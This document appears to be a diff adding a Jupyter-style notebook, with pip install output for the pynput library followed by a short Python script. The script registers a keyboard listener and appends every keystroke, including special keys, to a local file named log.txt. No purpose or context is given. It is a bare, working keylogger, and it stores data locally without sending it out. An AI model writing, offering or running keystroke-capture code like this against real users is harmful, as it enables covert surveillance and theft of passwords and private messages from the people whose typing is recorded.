@@ -1,0 +1,21 @@
+
+pip install pynput
+Requirement already satisfied: pynput in c:\users\desktop\appdata\local\programs\python\python312\lib\site-packages (1.7.7)
+Requirement already satisfied: six in c:\users\desktop\appdata\local\programs\python\python312\lib\site-packages (from pynput) (1.16.0)
+Note: you may need to restart the kernel to use updated packages.
+from pynput import keyboard, mouse
+import pynput
+
+def on_press(key):
+    try:
+        with open("log.txt", "a") as log_file:
+            log_file.write(f'{key.char}\n')
+    except AttributeError:
+        with open("log.txt", "a") as log_file:
+            log_file.write(f'{key}\n')
+
+# Set up the listener
+listener = pynput.keyboard.Listener(on_press=on_press)
+listener.start()
+listener.join()
+ 
